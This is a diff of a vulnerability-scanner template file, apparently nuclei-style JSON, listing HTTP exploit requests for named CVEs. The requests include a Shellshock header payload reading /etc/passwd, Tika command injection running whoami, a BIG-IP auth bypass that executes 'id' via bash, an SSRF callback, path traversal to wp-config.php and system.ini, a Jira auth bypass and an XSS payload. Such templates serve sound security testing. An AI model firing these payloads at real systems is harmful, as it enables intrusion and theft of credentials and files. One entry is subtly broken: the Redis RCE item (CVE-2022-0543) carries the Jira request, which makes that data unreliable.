@@ -3311,9 +3311,9 @@
       "requests": [
         {
           "headers": {
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6270,11 +6270,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript"
           },
           "method": "PUT",
           "path": [
@@ -9215,8 +9215,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -10911,9 +10911,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
             "content-type": "text/xml",
-            "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
+            "Cookie": "Login"
           },
           "method": "POST",
           "path": [
@@ -13013,8 +13013,8 @@
       "requests": [
         {
           "raw": [
-            "POST /mgmt/shared/authn/login HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nAuthorization: Basic YWRtaW46\nContent-Type: application/json\nCookie: BIGIPAuthCookie=1234\nConnection: close\n{\"username\":\"admin\",\"userReference\":{},\"loginReference\":{\"link\":\"http://localhost/mgmt/shared/gossip\"}}\n",
-            "POST /mgmt/tm/util/bash HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nX-F5-Auth-Token: {{token}}\nContent-Type: application/json\nConnection: close\n{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}\n"
+            "POST /mgmt/shared/authn/login HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nAuthorization: Basic YWRtaW46\nContent-Type: application/json\nCookie: BIGIPAuthCookie=1234\n\n{\"username\":\"admin\",\"userReference\":{},\"loginReference\":{\"link\":\"http://localhost/mgmt/shared/gossip\"}}\n",
+            "POST /mgmt/tm/util/bash HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nX-F5-Auth-Token: {{token}}\nContent-Type: application/json\n\n{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}\n"
           ]
         }
       ]
@@ -16931,6 +16931,21 @@
       ]
     },
     {
+      "id": "CVE-2022-0540",
+      "info": {
+        "name": "Atlassian Jira - Authentication bypass in Seraph",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/InsightPluginShowGeneralConfiguration.jspa;"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0543",
       "info": {
         "name": "Redis Sandbox Escape RCE",
@@ -16938,9 +16953,9 @@
       },
       "requests": [
         {
-          "raw": [
-            "GET / HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n",
-            "POST /index.php/backend_api/ajax_get_calendar_events HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\ncsrfToken={{csrf_token}}&startDate=2022-01-01&endDate=2022-01-01\n"
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/InsightPluginShowGeneralConfiguration.jspa;"
           ]
         }
       ]
@@ -17045,6 +17060,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-1439",
+      "info": {
+        "name": "Microweber Reflected Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/module/?module=%27onm%3Ca%3Eouseover=alert(document.domain)%27%22tabindex=1&style=width:100%25;height:100%25;&id=x&data-show-ui=admin&class=x&from_url={{BaseURL}}"
           ]
         }
       ]
